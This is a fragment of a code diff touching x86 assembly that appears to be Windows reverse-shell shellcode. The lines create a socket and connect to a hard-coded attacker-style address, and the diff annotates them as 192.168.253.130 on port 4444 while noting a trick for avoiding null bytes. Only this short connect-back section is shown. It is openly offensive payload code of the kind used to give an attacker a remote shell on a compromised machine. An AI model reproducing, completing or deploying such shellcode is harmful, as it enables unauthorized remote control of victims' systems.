@@ -94,8 +94,8 @@ call eax
 mov ebx, eax         ; Store WSASocket() handler
 
 ; connect(SOCKET s, const sockaddr *name, int namelen);
-push 0x82FDA8C0      ; IP address   
-mov eax, 0x5c110102  ; Port nr (first 2 bytes) 
+push 0x82FDA8C0      ; IP address, 192.168.253.130   
+mov eax, 0x5c110102  ; Port nr, 4444 (first 2 bytes) 
 dec ah               ; eax: 0x5c110102 -> 0x5c110002 (Mitigating null byte)
 push eax             ; Store portnr on stack
 mov esi, esp         ; Store pointer to portnr
